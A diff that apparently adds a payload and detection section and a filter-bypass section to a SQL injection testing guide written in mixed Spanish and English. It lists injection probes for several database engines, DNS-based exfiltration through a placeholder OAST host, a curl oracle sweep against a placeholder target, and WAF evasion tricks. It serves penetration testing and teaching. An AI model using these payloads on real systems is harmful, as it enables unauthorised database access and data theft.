@@ -167,6 +167,57 @@ done
 - Burp Suite Intruder with "Blind SQL injection" payload set for manual-grade time-based sweeps
   behind auth.
 
+## Payloads & Detection Patterns
+
+Families below are discovery-grade probes. Keep the injected marker unique per request so a
+hit is unambiguous in the response diff or the DB error text.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Quote/paren breakers | `'`, `"`, `')`, `")`, `'))`, `` ` `` | Romper el literal y provocar error de sintaxis (error-based) |
+| Boolean pairs | `1 AND 1=1` / `1 AND 1=2`, `' OR '1'='1'--`, `1)=(1` | Diferencia TRUE/FALSE sin error (blind booleano) |
+| Time oracles | MySQL `AND SLEEP(5)`, MSSQL `;WAITFOR DELAY '0:0:5'--`, PG `AND pg_sleep(5)--`, Oracle `AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | Confirmación ciega por latencia por motor |
+| UNION probes | `ORDER BY N--` (conteo), `-1 UNION SELECT NULL,@@version,NULL--` | Fijar columnas y extraer un dato interno |
+| Stacked queries | `1; INSERT...--`, `1; EXEC xp_cmdshell...` | Segunda sentencia (solo MSSQL/PG con driver multi-statement) |
+| Column/identifier ctx | `col::int` (PG), `CAST(col AS int)`, `ORDER BY (SELECT 1)` | Inyección en nombre de columna/ORDER BY donde el bind no aplica |
+| NoSQL operator | `{"pwd":{"$ne":null}}`, `{"user":{"$regex":"^adm"}}`, `pwd[$gt]=` | Bypass de auth / extracción booleana en Mongo/Express |
+| OOB exfil | MSSQL `UTL_HTTP`/UNC `\\TOKEN.oast\a`, Oracle `UTL_INADDR`, MySQL `LOAD_FILE(CONCAT('\\\\',(SELECT ...),'.TOKEN.oast'))` | Exfil ciega vía DNS/HTTP con token OAST |
+
+Surface signals que delatan la clase antes de inyectar:
+- Params `id`, `sort`, `order`, `category`, `filter`, `page`, `q`, `uid` reflejados en orden/tamaño del result set.
+- Errores con `SQLSTATE`, `mysqli_`, `ORA-\d+`, `pg_query`, `ODBC`, `sqlite3.OperationalError` en el body o en headers `X-`.
+- APIs JSON que aceptan `{"sort":"name"}` / `{"filter":{...}}` → contexto de identificador, no de valor.
+- Bodies que aceptan JSON anidado con claves tipo `$ne`/`$regex` sin rechazo → backend NoSQL.
+- Headers logueados a DB: `X-Forwarded-For`, `User-Agent`, `Referer` (WAF suele filtrar solo params).
+
+```bash
+# Barrido de oráculos de error por param (marcador único para dedup)
+for p in "'" "\"" "')" "1 AND 1=1" "1 AND 1=2" "1' AND '1'='2"; do
+  echo "== $p =="
+  curl -s --get --data-urlencode "id=$p" "https://target/app" \
+    | grep -Eio "sql syntax|mysqli|ORA-[0-9]+|SQLSTATE|pg_query|ODBC|sqlite3\.OperationalError"
+done
+
+# Oráculo de tiempo con control de latencia (ruling out jitter)
+time curl -s "https://target/app?id=1" -o /dev/null                       # control
+time curl -s "https://target/app?id=1 AND SLEEP(5)" -o /dev/null           # payload
+```
+
+## Bypass Techniques
+
+Agrupadas por el filtro que evaden; probar la familia completa antes de declarar no-inyectable.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Keyword blocklist (`SELECT`,`UNION`) | Comentarios inline `UN/**/ION SE/**/LECT`, versioned `/*!50000UNION*/`, mixed case `uNiOn` | MySQL interpreta `/*! */`; útil contra reglas regex ingenuas |
+| Comillas bloqueadas | `CHAR()`/`CHR()` concat, hex `0x61646d696e`, sin comillas en contexto numérico | Evita el literal string por completo |
+| Espacios filtrados | `/**/`, `%09`/`%0a`/`%0c`, paréntesis `UNION(SELECT(1))`, `+` | Varía por parser; probar tab/newline |
+| `=` o `AND/OR` bloqueados | `LIKE`, `RLIKE`, `BETWEEN`, `||`/`&&`, `NOT IN` | Reescribir la lógica booleana |
+| WAF normaliza payload | Mover a header (`X-Forwarded-For`, `User-Agent`), doble URL-encode `%2527`, overlong UTF-8 | WAF a nivel param no cubre headers logueados |
+| Rate-limit / bloqueo IP | Throttle `-t`, rotar `--random-agent`, menos `--risk`/`--level` en sqlmap | Evita falsos negativos por bloqueo, no por parcheo |
+| Validación de tipo (int cast) | Inyectar en contexto de identificador (`ORDER BY`, nombre de columna) donde no hay bind | ORM "seguro" sigue concatenando identificadores |
+| Blocklist de operadores Mongo | Bracket notation `pwd[$ne]=`, anidar `$where`/`$regex`, type-juggling array `user[]=` | Parsers form-encoded expanden corchetes a objetos |
+
 ## Root Causes
 
 - String concatenation into SQL instead of parameterized queries/prepared statements.
